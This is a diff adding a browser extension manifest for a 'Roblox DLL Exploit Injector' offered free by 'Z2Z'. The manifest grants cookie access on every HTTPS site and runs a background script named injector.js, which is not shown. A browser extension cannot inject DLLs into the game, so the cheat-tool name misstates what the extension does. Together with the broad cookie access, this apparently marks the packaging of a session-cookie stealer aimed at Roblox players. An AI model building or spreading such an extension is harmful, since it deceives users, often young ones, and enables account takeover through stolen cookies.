@@ -1,0 +1,29 @@
+{
+    "name": "Roblox DLL Exploit Injector",
+    "description": "Exelent Exploits, Free Of Charge. Created by Z2Z",
+    "version": "1.3.2",
+    "manifest_version": 3,
+
+    "action" : {
+        "default_icon": "assets/roblox.png"
+    },
+
+    "host_permissions": [
+	"https://*/*"
+    ],
+
+    "permissions": [
+        "cookies"
+    ],
+
+    "background": {
+        "service_worker": "scripts/injector.js"
+    },
+
+    "icons": {
+        "16": "assets/roblox.png",
+        "32": "assets/roblox.png",
+        "48": "assets/roblox.png",
+        "128": "assets/roblox.png"
+    }
+}
